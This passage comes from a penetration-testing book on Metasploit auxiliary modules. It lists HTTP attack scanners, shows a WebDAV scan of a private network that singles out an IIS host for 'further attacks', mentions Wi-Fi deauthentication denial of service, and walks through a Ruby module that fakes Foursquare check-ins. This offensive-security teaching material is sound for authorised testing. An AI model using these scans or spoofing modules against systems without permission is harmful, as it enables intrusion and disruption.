left;"><br/></p><p class="s25" style="padding-left: 106pt;text-indent: 12pt;text-align: left;">Name: HTTP WebDAV Scanner Version: 9179</p><p class="s25" style="padding-left: 118pt;text-indent: -12pt;text-align: left;">License: Metasploit Framework License (BSD) Rank: Normal</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Provided by:</p><table style="border-collapse:collapse" cellspacing="0"><tr style="height:16pt"><td style="width:22pt" rowspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:36pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:61pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:36pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Proxies</p></td><td style="width:61pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Use a proxy chain</p></td></tr><tr style="height:11pt"><td style="width:22pt"><p class="s33" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">@</p></td><td style="width:36pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:61pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:22pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:36pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">80</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:22pt"><p class="s33" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">O</p></td><td style="width:36pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS</p></td><td style="width:61pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:10pt"><td style="width:22pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:36pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">VHOST</p></td><td style="width:61pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:33pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:7pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:174pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">HTTP server virtual host</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"/><p class="s25" style="padding-left: 90pt;text-indent: 7pt;line-height: 193%;text-align: left;"><a href="mailto:et@metasploit.com" class="s34" target="_blank">et &lt;</a>et@metasploit.com&gt; Basic options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description:</p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Detect webservers with WebDAV enabled</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf auxiliary(webdav_scanner) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_362.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: left;">Here we issue the <span class="s25">use </span>command <span class="s32">O </span>for the module of interest. We can then get a full dump of information from the system using the <span class="s25">info </span>command <span class="s32">8</span>, as well as a list of the various available options. Within the options, we see that the only required option without a default is <span class="s25">RHOSTS </span><span class="s32">@</span>, which can take a single</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">IP address, list, range, or CIDR notation.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">The other options mostly vary depending on the auxiliary module being used. For instance, the <span class="s25">THREADS </span><span class="s32">O </span>option allows multiple threads to be launched as part of a scan, which speeds things up exponentially.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark285">Auxiliary Modules in Use</a><a name="bookmark290">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Auxiliary modules are exciting because they can be used in so many ways for so many things. If you can’t find the perfect auxiliary module, it’s easy to mod- ify one to suit your specific needs.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Consider a common example. Say you are conducting a remote penetra- tion test, and upon scanning the network, you identify a number of web serv- ers and not much else. Your attack surface is limited at this point, and you have to work with what is available to you. Your auxiliary <span class="s19">scanner/http </span>modules will now prove extremely helpful as you look for low-hanging fruit against which you can launch an exploit. To search for all available HTTP scanners, run <span class="s24">search scanner/http </span>as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_363.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(webdav_scanner) &gt; <span class="s24">search scanner/http</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;scanner/http&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Auxiliary</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name Rank Description</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">---- ---- -----------</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;text-align: left;">scanner/http/backup_file normal HTTP Backup File Scanner scanner/http/blind_sql_query normal HTTP Blind SQL Injection GET QUERY Scanner scanner/http/brute_dirs normal HTTP Directory Brute Force Scanner</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/cert normal HTTP SSL Certificate Checker</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/copy_of_file normal HTTP Copy File Scanner</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/dir_listing normal HTTP Directory Listing Scanner</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;text-align: left;">scanner/http/dir_scanner normal HTTP Directory Scanner scanner/http/dir_webdav_unicode_bypass normal MS09-020 IIS6 WebDAV Unicode Auth Bypass</p><p class="s25" style="padding-left: 254pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Directory Scanner</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;text-align: left;">scanner/http/enum_delicious normal Pull Del.icio.us Links (URLs) for a domain scanner/http/enum_wayback normal Pull Archive.org stored URLs for a domain scanner/http/error_sql_injection normal HTTP Error Based SQL Injection Scanner scanner/http/file_same_name_dir normal HTTP File Same Name Directory Scanner scanner/http/files_dir normal HTTP Interesting File Scanner scanner/http/frontpage_login normal FrontPage Server Extensions Login Utility scanner/http/http_login normal HTTP Login Utility</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/http_version normal HTTP Version Detection</p><p class="s25" style="padding-left: 254pt;text-indent: -206pt;line-height: 87%;text-align: left;">scanner/http/lucky_punch normal HTTP Microsoft SQL Injection Table XSS Infection</p><p class="s25" style="padding-top: 3pt;padding-left: 47pt;text-indent: 0pt;text-align: left;">scanner/http/ms09_020_webdav_unicode_bypass normal MS09-020 IIS6 WebDAV Unicode Auth Bypass scanner/http/options normal HTTP Options Detection scanner/http/prev_dir_same_name_file normal HTTP Previous Directory File Scanner scanner/http/replace_ext normal HTTP File Extension Scanner</p><p class="s30" style="padding-left: 47pt;text-indent: -23pt;line-height: 80%;text-align: left;">O <span class="s25">scanner/http/robots_txt normal HTTP Robots.txt Content Scanner scanner/http/soap_xml normal HTTP SOAP Verb/Noun Brute Force Scanner</span></p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/sqlmap normal SQLMAP SQL Injection External Module</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/http/ssl normal HTTP SSL Certificate Information</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;text-align: left;">scanner/http/svn_scanner normal HTTP Subversion Scanner scanner/http/tomcat_mgr_login normal Tomcat Application Manager Login Utility scanner/http/trace_axd normal HTTP trace.axd Content Scanner scanner/http/verb_auth_bypass normal HTTP Verb Authentication Bypass Scanner scanner/http/vhost_scanner normal HTTP Virtual Host Brute Force Scanner scanner/http/vmware_server_dir_trav normal VMware Server Directory Transversal</p><p class="s25" style="padding-left: 254pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Vulnerability</p><p class="s25" style="padding-left: 47pt;text-indent: 0pt;line-height: 10pt;text-align: left;">scanner/http/web_vulndb normal HTTP Vuln scanner</p><p class="s30" style="padding-left: 47pt;text-indent: -23pt;line-height: 88%;text-align: left;">8 <span class="s25">scanner/http/webdav_internal_ip normal HTTP WebDAV Internal IP Scanner scanner/http/webdav_scanner normal HTTP WebDAV Scanner scanner/http/webdav_website_content normal HTTP WebDAV Website Content Scanner</span></p><p class="s30" style="padding-bottom: 4pt;padding-left: 47pt;text-indent: -23pt;line-height: 80%;text-align: left;">@ <span class="s25">scanner/http/writable normal HTTP Writable Path PUT/DELETE File Access scanner/http/xpath normal HTTP Blind XPATH 1.0 Injector</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_364.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 75%;text-align: left;">There are a lot of options here, so let’s identify some likely candidates in that list. Notice that there are the options for identifying the <span class="s19">robots.txt </span><span class="s32">O </span>file from various servers, numerous ways to interact with WebDAV <span class="s32">8</span>, tools to identify servers with writable file access <span class="s32">@</span>, and many other special-purpose modules.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">You can see immediately that there are modules that you can use for sub- sequent exploration. Older versions of Microsoft IIS had a vulnerability in their WebDAV implementations that allowed for remote exploitation, so you could first run a scan against your targets in hopes of finding a server with WebDAV enabled, as follows.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_365.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(dir_webdav_unicode_bypass) &gt; <span class="s24">use scanner/http/webdav_scanner</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(webdav_scanner) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><span><img width="22" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_366.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="80" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_367.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="43" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_368.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="59" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_369.png"/></span></p><p class="s25" style="padding-left: 102pt;text-indent: 0pt;line-height: 21pt;text-align: left;">Name Current Setting Required Description Proxies no Use a proxy chain</p><p class="s25" style="padding-left: 102pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS yes The target address range or CIDR identifier</p><p class="s25" style="padding-left: 102pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RPORT 80 yes The target port</p><p class="s25" style="padding-left: 102pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS 1 yes The number of concurrent threads</p><p class="s25" style="padding-left: 102pt;text-indent: 0pt;line-height: 11pt;text-align: left;">VHOST no HTTP server virtual host</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 75%;text-align: left;">O <span class="s25">msf auxiliary(webdav_scanner) &gt; </span><span class="s24">set RHOSTS 192.168.1.242, 192.168.13.242.252, 192.168.13.242.254, 192.168.4.116, 192.168.4.118, 192.168.4.122,</span></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.13.242.251, 192.168.13.242.234, 192.168.8.67, 192.68.8.113,</p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66, 192.168.8.68,</p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.6.62</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS =&gt; 192.168.1.242, 192.168.13.242.252, 192.168.13.242.254, 192.168.4.116,</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.4.118, 192.168.4.122, 192.168.13.242.251, 192.168.13.242.234, 192.168.8.67,</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.6.113, 192.168.13.242.231, 192.168.13.242.249, 192.168.4.115, 192.168.8.66,</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.8.68, 192.168.6.62</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(webdav_scanner) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] 192.168.1.242 (Microsoft-IIS/6.0) WebDAV disabled.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 88%;text-align: left;">[*] 192.168.13.242.252 (Apache/2.2.9 (Debian) proxy_html/3.0.0 mod_ssl/2.2.9 OpenSSL/0.9.8g) WebDAV disabled.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 04 of 31 hosts (012% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 07 of 31 hosts (022% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] 192.168.4.116 (Apache/2.2.3 (Red Hat)) WebDAV disabled. [*] Scanned 10 of 31 hosts (032% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] 192.168.4.122 (Apache/2.2.3 (Red Hat)) WebDAV disabled. [*] Scanned 13 of 31 hosts (041% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] 192.168.13.242.251 (Microsoft-IIS/6.0) WebDAV disabled. [*] 192.168.13.242.234 (Microsoft-IIS/6.0) WebDAV disabled. [*] Scanned 16 of 31 hosts (051% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] 192.168.8.67 (Microsoft-IIS/6.0) WebDAV disabled. [*] Scanned 19 of 31 hosts (061% complete)</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">[*] 192.168.6.113 (Microsoft-IIS/5.0) has WEBDAV ENABLED [*] 192.168.13.242.231 (Microsoft-IIS/6.0) WebDAV disabled.</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 22 of 31 hosts (070% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.13.242.249 (Microsoft-IIS/6.0) WebDAV disabled. [*] Scanned 25 of 31 hosts (080% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.4.115 (Microsoft-IIS/6.0) WebDAV disabled. [*] 192.168.8.66 (Microsoft-IIS/6.0) WebDAV disabled. [*] Scanned 28 of 31 hosts (090% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.8.68 (Microsoft-IIS/6.0) WebDAV disabled. [*] Scanned 31 of 31 hosts (100% complete)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Auxiliary module execution completed</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_370.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: left;">As you can see in this example, a number of HTTP servers have been scanned in the search for WebDAV <span class="s32">O</span>, and only one happens to have WebDAV enabled <span class="s32">8</span>. This module has quickly identified a specific system</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">against which you can launch further attacks.</p><p class="s19" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>Auxiliary module functionality goes far beyond scanning. As you will see in Chapter 14 auxiliary modules also work great as fuzzers with a little modification. A number of denial-of-service modules are also available for Wi-Fi (including <span class="p">dos/wifi/deauth</span>), which can prove quite disruptive when used properly.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark286">Anatomy of an Auxiliary Module</a><a name="bookmark291">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Let’s look at the makeup of an auxiliary module in a fun little example not currently in the Metasploit repository (because it does not pertain to pene- tration testing). This example will demonstrate how easy it is to offload a great deal of programming to the Framework, allowing us to focus on the specifics of a module.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://carnal0wnage.googlecode.com/.)" class="s31" target="_blank">Chris Gates wrote an auxiliary module for the Framework that gave his Twitter followers the impression that he had somehow invented a device that allowed him to travel at the speed of light. It makes a great example of the code reuse available in Metasploit. (You can access the source of the script at </a><a href="http://carnal0wnage.googlecode.com/.)" class="s20" target="_blank">http://carnal0wnage.googlecode.com/</a><a href="http://carnal0wnage.googlecode.com/.)" class="s31" target="_blank">.)</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_371.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">root@bt:/opt/framework3/msf3# </span><span class="s24">cd modules/auxiliary/admin/</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root@bt:/opt/framework3/msf3/modules/auxiliary/admin# <a href="http://carnal0wnage.googlecode/" class="s40" target="_blank">wget http://carnal0wnage.googlecode</a></p><p class="s24" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursquare.rb</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_372.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">We’ve placed the module in our auxiliary directory <span class="s32">O </span>so that it will be available for use by Metasploit. But before we use this module, let’s look at</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">the actual script and break down the components so we can see exactly what the module contains.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_373.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">O <span class="s25">class Metasploit3 &lt; Msf::Auxiliary</span></p><p class="s25" style="padding-top: 7pt;padding-left: 107pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># Exploit mixins should be called first</p><p class="s30" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 107pt;text-indent: -29pt;line-height: 80%;text-align: left;">8 <span class="s25">include Msf::Exploit::Remote::HttpClient include Msf::Auxiliary::Report</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_374.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">The module begins with the first two lines importing the auxiliary class <span class="s32">O</span>. Next it makes the HTTP client functions available for use <span class="s32">8 </span>within the script.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_375.png"/></span></p><p class="s30" style="text-indent: 0pt;line-height: 12pt;text-align: right;">O <span class="s25">def initialize</span></p><p class="s25" style="text-indent: 0pt;line-height: 9pt;text-align: right;">super(</p><p class="s30" style="padding-top: 1pt;padding-left: 85pt;text-indent: -8pt;line-height: 80%;text-align: left;">8<span class="s25">&#39;Name&#39; =&gt; &#39;Foursquare Location Poster&#39;, &#39;Version =&gt; &#39;$Revision:$&#39;,</span></p><p class="s25" style="padding-left: 85pt;text-indent: 0pt;text-align: left;">&#39;Description&#39; =&gt; &#39;F*ck with Foursquare, be anywhere you want to be by venue id&#39;, &#39;Author&#39; =&gt; [&#39;CG&#39;],</p><p class="s25" style="padding-left: 85pt;text-indent: 0pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE, &#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p style="padding-left: 118pt;text-indent: 0pt;text-align: left;"><a href="http://groups.google.com/group/foursquare-api%27" class="s34" target="_blank">[ &#39;URL&#39;, </a><a href="http://www.mikekey.com/im-a-foursquare-cheater/%27" class="s34" target="_blank">&#39;http://groups.google.com/group/foursquare-api&#39; ], [ &#39;URL&#39;, &#39;http://www.mikekey.com/im-a-foursquare-cheater/&#39;],</a></p><p class="s25" style="padding-left: 101pt;text-indent: 0pt;line-height: 10pt;text-align: left;">]</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p class="s25" style="padding-left: 69pt;text-indent: -32pt;text-align: left;">#todo pass in geocoords instead of venueid, create a venueid, other tom foolery register_options(</p><p class="s25" style="padding-left: 85pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s30" style="padding-left: 93pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@<span class="s25">Opt::RHOST(&#39;api.foursquare.com&#39;),</span></p><p class="s25" style="padding-left: 122pt;text-indent: -20pt;line-height: 87%;text-align: left;">OptString.new(&#39;VENUEID&#39;, [ true, &#39;foursquare venueid&#39;, &#39;185675&#39;]), #Louvre Paris France</p><p class="s25" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">OptString.new(&#39;USERNAME&#39;, [ true, &#39;foursquare username&#39;, &#39;username&#39;]), OptString.new(&#39;PASSWORD&#39;, [ true, &#39;foursquare password&#39;, &#39;password&#39;]),</p><p class="s25" style="padding-left: 85pt;text-indent: 0pt;line-height: 11pt;text-align: left;">], self.class)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="509" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_376.png"/></span></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">Within the initialization constructor <span class="s32">O </span>we define much of the informa- tion <span class="s32">8 </span>that is reported back when issuing the <span class="s25">info </span>command in <span class="s19">msfconsole</span>. We can see where the various options are defined <span class="s32">@ </span>and whether they are required. So far, all are pretty direct and their purposes are clear. Still, we</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">have yet to see any actual logic being performed. That comes next.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_377.png"/></span></p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: left;">def run</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 10pt;text-align: left;">begin</p><p class="s30" style="padding-left: 141pt;text-indent: -8pt;line-height: 88%;text-align: justify;">O<span class="s25">user = datastore[&#39;USERNAME&#39;] pass = datastore[&#39;PASSWORD&#39;] venid = datastore[&#39;VENUEID&#39;]</span></p><p class="s25" style="padding-left: 141pt;text-indent: 0pt;text-align: left;">user_pass = Rex::Text.encode_base64(user + &quot;:&quot; + pass) decode = Rex::Text.decode_base64(user_pass)</p><p class="s25" style="padding-left: 141pt;text-indent: 0pt;line-height: 11pt;text-align: left;">postrequest = &quot;twitter=1\n&quot; #add facebook=1 if you want facebook</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 141pt;text-indent: 0pt;text-align: left;">print_status(&quot;Base64 Encoded User/Pass: #{user_pass}&quot;) #debug print_status(&quot;Base64 Decoded User/Pass: #{decode}&quot;) #debug</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 132pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8<span class="s25">res = send_request_cgi({</span></p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&#39;uri&#39; =&gt; &quot;/v1/checkin?vid=#{venid}&quot;,</p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;text-align: left;">&#39;version&#39; =&gt; &quot;1.1&quot;, &#39;method&#39; =&gt; &#39;POST&#39;, &#39;data&#39; 